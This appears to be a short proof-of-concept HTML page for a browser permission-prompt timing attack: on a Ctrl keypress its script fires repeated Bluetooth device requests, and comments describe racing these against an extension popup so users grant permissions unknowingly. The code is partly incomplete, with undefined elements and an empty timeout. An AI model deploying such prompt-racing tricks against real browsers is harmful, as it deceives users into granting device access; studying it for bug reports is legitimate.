<html>
<head>
<style>
html { font-family: sans-serif; }
.instructions {
  width: 360px;
  height: 200px;
  background: #ddd;
  border-radius: 0.5em;
  padding: 1em;
  display: none;
}
.show { display: block; }
</style>
</head>
<body>

<script>

var isScreenShare = window.location.search.indexOf('screenshare') > -1;

if (isScreenShare) {
  instructionsShare.classList.add('show');
} else {
  instructionsPlay.classList.add('show');
}

window.addEventListener('keydown', (e) => {
  // Open prompt on 'ctrl'
  if (e.keyCode === 17) {
            navigator.bluetooth.requestDevice({acceptAllDevices:true})
 setTimeout(() => {
         navigator.bluetooth.requestDevice({acceptAllDevices:true});
      }, 1);
    if (isScreenShare) {
      // Secondary scenario: screen share dialog
      // Slight delay here to reduce time where screen share dialog is visible but extension popup is still opening.
      // If we call getDisplayMedia() *after* extension popup is opened, the extension popup is closed and attack fails.
      setTimeout(() => {
         navigator.bluetooth.requestDevice({acceptAllDevices:true});
      }, 400);
    } else {
      // Main scenario: permission prompt
      // Slight delay here to reduce time where permission prompt is visible but extension popup is still opening.
      // If we call getUserMedia() *after* extension popup is opened, the permission prompt
      // is not shown until extension prompt is closed by user.
      setTimeout(() => {

              }, 1);
    }
  }
});
</script>

</body>
</html>


